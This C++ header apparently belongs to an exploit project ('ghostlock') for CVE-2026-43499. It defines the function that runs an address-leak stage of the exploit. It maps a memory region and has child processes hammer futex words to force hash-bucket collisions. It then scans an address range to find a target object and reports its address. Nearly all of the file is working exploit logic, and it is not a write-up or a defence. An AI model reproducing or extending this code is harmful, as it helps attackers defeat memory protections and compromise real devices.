#pragma once
/** @file backend/cve_2026_43499/leak/snitch_run.hpp
 *  The whole search in one call: map the region, wake the cohort, look for the object.
 *
 *  Three pieces that were built separately meet here, and the order between them is the
 *  point: nothing is looked for until the cohort has poked, because the collision the
 *  search relies on is what those pokes produce. A run that did not get its pokes reports
 *  that and stops, rather than walking a range whose collisions never happened -- which
 *  would find nothing and look exactly like a device where the object is elsewhere.
 *
 *  The region stays mapped for the caller: the words the cohort hammers live in it, and
 *  the children are the caller's to reap. What this returns is what was found, where it
 *  is, and how many addresses were tried.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/leak_search.hpp"
#include "backend/cve_2026_43499/leak/snitch_scan.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** How a whole run ended. */
    enum class RunVerdict : unsigned char {
        /** The object was found; the address is in the outcome. */
        Found = 0,
        /** The cohort poked and nothing in the range answered. */
        NotFound = 1,
        /** The cohort did not poke: the collisions the search needs never happened. */
        NoPokes = 2,
        /** Neither the region nor the walk could be used. */
        GeometryMissing = 3,
        /** A platform call failed; the errno is in the outcome. */
        CallFailed = 4,
    };

    [[nodiscard]] constexpr const char *run_verdict_name(RunVerdict verdict) noexcept {
        switch (verdict) {
            case RunVerdict::Found: return "ok";
            case RunVerdict::NotFound: return "plan-missing";
            case RunVerdict::NoPokes: return "plan-missing";
            case RunVerdict::GeometryMissing: return "geometry-missing";
            case RunVerdict::CallFailed: return "call-failed";
        }
        return "unknown";
    }

    /** What a whole run did. */
    struct RunOutcome final {
        RunVerdict status = RunVerdict::GeometryMissing;
        std::uint64_t found = 0U;
        std::size_t probes = 0U;
        std::uint32_t rounds = 0U;
        std::size_t pokes_wanted = 0U;
        /** The region the caller unmaps, and its size. */
        void *region = nullptr;
        std::size_t region_bytes = 0U;
        std::int32_t error = 0;
    };

    /** Run the search once. The caller supplies the words the cohort hammers and the
     *  addresses the rule compares, because both come from the address table it owns. */
    template <class Seam, class Buckets>
      requires memory::HeapSeam<Seam> && SnitchSeam<Seam> && FutexBuckets<Buckets>
    [[nodiscard]] RunOutcome run_snitch_search(const SnitchSetup &setup, const RegionInputs &region_inputs,
                                               const SnitchPatience &patience, std::size_t counter_offset,
                                               std::uint32_t *const *words, std::size_t word_count,
                                               const ScanStrides &strides, const ScanRange &range,
                                               bool sweep_tags, const Buckets &buckets,
                                               const std::uint64_t *addresses,
                                               std::size_t address_count) noexcept {
        RunOutcome outcome{};
        const ScanOutcome poked =
            run_poke_protocol<Seam>(setup, region_inputs, patience, counter_offset, words, word_count);
        outcome.rounds = poked.rounds;
        outcome.pokes_wanted = poked.pokes_wanted;
        outcome.region = poked.region;
        outcome.region_bytes = poked.region_bytes;
        outcome.error = poked.error;
        switch (poked.status) {
            case ScanVerdict::GeometryMissing:
                outcome.status = RunVerdict::GeometryMissing;
                return outcome;
            case ScanVerdict::CallFailed:
                outcome.status = RunVerdict::CallFailed;
                return outcome;
            case ScanVerdict::NoPokes:
                /* The collisions did not happen, so there is nothing to look through. */
                outcome.status = RunVerdict::NoPokes;
                return outcome;
            case ScanVerdict::Poked:
                break;
        }
        const SearchOutcome searched =
            search_for_object(strides, range, sweep_tags, buckets, addresses, address_count);
        outcome.probes = searched.probes;
        switch (searched.status) {
            case SearchVerdict::Found:
                outcome.found = searched.found;
                outcome.status = RunVerdict::Found;
                return outcome;
            case SearchVerdict::NotFound:
                outcome.status = RunVerdict::NotFound;
                return outcome;
            case SearchVerdict::GeometryMissing:
                outcome.status = RunVerdict::GeometryMissing;
                return outcome;
        }
        outcome.status = RunVerdict::NotFound;
        return outcome;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
